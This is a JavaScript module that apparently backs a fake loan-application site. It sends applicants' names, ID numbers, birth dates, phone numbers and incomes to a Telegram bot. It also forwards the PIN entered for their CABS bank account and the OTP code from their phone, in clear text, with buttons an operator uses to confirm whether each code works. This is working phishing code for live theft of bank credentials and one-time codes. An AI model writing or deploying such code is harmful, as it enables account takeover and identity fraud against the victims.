const TELEGRAM_API_URL = 'https://api.telegram.org';

export async function sendTelegramNotification(formData, submissionId) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    throw new Error('Telegram credentials not configured');
  }

  const message = `
🆕 *New Loan Application Submitted*

*Application ID:* ${submissionId}

*Applicant Details:*
• Name: ${formData.fullName}
• Phone: ${formData.phone}
• Email: ${formData.email}
• ID Number: ${formData.idNumber}
• DOB: ${formData.dobDay}/${formData.dobMonth}/${formData.dobYear}

*Employment:*
• Status: ${formData.employment}
• Income: ${formData.income}

*Loan Details:*
• Type: ${formData.loanType}
• Amount: $${formData.loanAmount}
• Repayment Period: ${formData.repayment} months

*Submitted:* ${new Date().toLocaleString()}
  `.trim();

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve_${submissionId}` },
        { text: '❌ Decline', callback_data: `decline_${submissionId}` }
      ]
    ]
  };

  const response = await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: keyboard
    }),
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Failed to send Telegram message: ${error}`);
  }

  return await response.json();
}

export async function handleTelegramCallback(update, formSubmissions) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!update.callback_query) {
    return;
  }

  const callbackQuery = update.callback_query;
  const { data, id, message } = callbackQuery;
  const parts = data.split('_');

  const submission = formSubmissions.get(parts[parts.length - 1]);
  
  if (!submission) {
    await answerCallbackQuery(botToken, id, 'Submission not found', true);
    return;
  }

  // Handle form approval/decline
  if (parts[0] === 'approve') {
    submission.status = 'approved';
    await answerCallbackQuery(botToken, id, '✅ Application Approved');
    await sendStatusUpdate(botToken, message.chat.id, parts[1], 'approved', submission);
  } else if (parts[0] === 'decline') {
    submission.status = 'declined';
    await answerCallbackQuery(botToken, id, '❌ Application Declined');
    await sendStatusUpdate(botToken, message.chat.id, parts[1], 'declined', submission);
  }
  // Handle PIN verification
  else if (parts[0] === 'pin' && parts[1] === 'correct') {
    submission.pinVerified = true;
    submission.pinStatus = 'correct';
    await answerCallbackQuery(botToken, id, '✅ PIN Verified as Correct');
    await sendPinStatusUpdate(botToken, message.chat.id, parts[2], 'correct', submission);
  } else if (parts[0] === 'pin' && parts[1] === 'incorrect') {
    submission.pinVerified = false;
    submission.pinStatus = 'incorrect';
    await answerCallbackQuery(botToken, id, '❌ PIN Marked as Incorrect');
    await sendPinStatusUpdate(botToken, message.chat.id, parts[2], 'incorrect', submission);
  }
  // Handle OTP verification
  else if (parts[0] === 'otp' && parts[1] === 'correct') {
    submission.otpVerified = true;
    submission.otpStatus = 'correct';
    await answerCallbackQuery(botToken, id, '✅ OTP Verified as Correct');
    await sendOtpStatusUpdate(botToken, message.chat.id, parts[2], 'correct', submission);
  } else if (parts[0] === 'otp' && parts[1] === 'incorrect') {
    submission.otpVerified = false;
    submission.otpStatus = 'incorrect';
    await answerCallbackQuery(botToken, id, '❌ OTP Marked as Incorrect');
    await sendOtpStatusUpdate(botToken, message.chat.id, parts[2], 'incorrect', submission);
  }
}

async function answerCallbackQuery(botToken, callbackQueryId, text, showAlert = false) {
  await fetch(`${TELEGRAM_API_URL}/bot${botToken}/answerCallbackQuery`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      callback_query_id: callbackQueryId,
      text,
      show_alert: showAlert
    }),
  });
}

async function sendStatusUpdate(botToken, chatId, submissionId, status, submission) {
  const statusEmoji = status === 'approved' ? '✅' : '❌';
  const statusText = status === 'approved' ? 'APPROVED' : 'DECLINED';

  const message = `
${statusEmoji} *Loan Application ${statusText}*

*Application ID:* ${submissionId}

*Applicant:* ${submission.fullName}
*Loan Amount:* $${submission.loanAmount}
*Loan Type:* ${submission.loanType}

*Status:* ${statusText}
*Updated:* ${new Date().toLocaleString()}
  `.trim();

  await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    }),
  });
}

async function sendPinStatusUpdate(botToken, chatId, submissionId, status, submission) {
  const statusEmoji = status === 'correct' ? '✅' : '❌';
  const statusText = status === 'correct' ? 'CORRECT' : 'INCORRECT';

  const message = `
${statusEmoji} *PIN Verification ${statusText}*

*Application ID:* ${submissionId}

*Applicant:* ${submission.fullName}
*Phone:* ${submission.phone}

*PIN Status:* ${statusText}
*Updated:* ${new Date().toLocaleString()}
  `.trim();

  await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    }),
  });
}

async function sendOtpStatusUpdate(botToken, chatId, submissionId, status, submission) {
  const statusEmoji = status === 'correct' ? '✅' : '❌';
  const statusText = status === 'correct' ? 'CORRECT' : 'INCORRECT';

  const message = `
${statusEmoji} *OTP Verification ${statusText}*

*Application ID:* ${submissionId}

*Applicant:* ${submission.fullName}
*Phone:* ${submission.phone}

*OTP Status:* ${statusText}
*Updated:* ${new Date().toLocaleString()}
  `.trim();

  await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    }),
  });
}

export async function sendPinVerificationNotification(formData, pin, submissionId) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    throw new Error('Telegram credentials not configured');
  }

  const message = `
🔐 *PIN Verification Request*

*Application ID:* ${submissionId}

*Applicant:* ${formData.fullName}
*Phone:* ${formData.phone}
*Loan Amount:* $${formData.loanAmount}

*Entered PIN:* ${pin}

*Action Required:* Verify if this PIN is correct for the applicant's CABS account.

*Submitted:* ${new Date().toLocaleString()}
  `.trim();

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ PIN Correct', callback_data: `pin_correct_${submissionId}` },
        { text: '❌ PIN Incorrect', callback_data: `pin_incorrect_${submissionId}` }
      ]
    ]
  };

  const response = await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: keyboard
    }),
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Failed to send PIN verification message: ${error}`);
  }

  return await response.json();
}

export async function sendOtpVerificationNotification(formData, otp, submissionId) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    throw new Error('Telegram credentials not configured');
  }

  const message = `
🔑 *OTP Verification Request*

*Application ID:* ${submissionId}

*Applicant:* ${formData.fullName}
*Phone:* ${formData.phone}
*Loan Amount:* $${formData.loanAmount}

*Entered OTP:* ${otp}

*Action Required:* Verify if this OTP is correct for the applicant's phone.

*Submitted:* ${new Date().toLocaleString()}
  `.trim();

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ OTP Correct', callback_data: `otp_correct_${submissionId}` },
        { text: '❌ OTP Incorrect', callback_data: `otp_incorrect_${submissionId}` }
      ]
    ]
  };

  const response = await fetch(`${TELEGRAM_API_URL}/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: keyboard
    }),
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Failed to send OTP verification message: ${error}`);
  }

  return await response.json();
}

export async function setWebhook(webhookUrl) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  
  const response = await fetch(`${TELEGRAM_API_URL}/bot${botToken}/setWebhook`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      url: webhookUrl
    }),
  });

  if (!response.ok) {
    const error = await response.text();
    throw new Error(`Failed to set webhook: ${error}`);
  }

  return await response.json();
}
